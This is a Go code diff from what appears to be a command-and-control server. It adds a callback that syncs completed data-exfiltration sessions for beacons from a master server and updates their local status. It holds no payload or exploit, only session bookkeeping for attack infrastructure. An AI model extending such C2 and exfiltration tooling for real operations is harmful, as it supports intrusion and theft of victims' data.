@@ -800,7 +800,7 @@ func main() {
 		"startup_time": time.Now().Unix(),
 	}
 
-	_, _, err = masterClient.Checkin(stats)
+	_, _, _, err = masterClient.Checkin(stats)
 	if err != nil {
 		fmt.Printf("WARNING: Initial checkin to Master Server failed: %v\n", err)
 		fmt.Println("Continuing in resilient mode (will retry in background)")
@@ -872,6 +872,36 @@ func main() {
 		}
 
 		logf("[C2] Queued domain updates for %d beacon(s)", activeCount)
+	}, func(completedExfil []string) {
+		// Handle completed exfil sessions from Master
+		if len(completedExfil) == 0 {
+			return
+		}
+
+		logf("[C2] Received %d completed exfil session(s) from Master", len(completedExfil))
+
+		for _, sessionID := range completedExfil {
+			// Find the session in C2Manager
+			// We need to access the map directly or add a getter
+			// Since we are in main package, we can access c2Manager.exfilSessions if it's exported?
+			// No, it's private. But we are in the same package 'main'.
+			// So we can access it.
+
+			c2Manager.mutex.Lock()
+			session, exists := c2Manager.exfilSessions[sessionID]
+			c2Manager.mutex.Unlock()
+
+			if exists {
+				// If it exists locally, mark it as completed
+				// This will update the UI/CLI status
+				// We use finalizeExfilSession which handles locking and persistence
+				// It also sends a completion notification to Master, which is redundant but harmless
+				if session.Status != "completed" {
+					logf("[C2] Marking exfil session %s as completed (synced from Master)", sessionID)
+					c2Manager.finalizeExfilSession(session)
+				}
+			}
+		}
 	})
 
 	// Start periodic task polling (every 10 seconds)
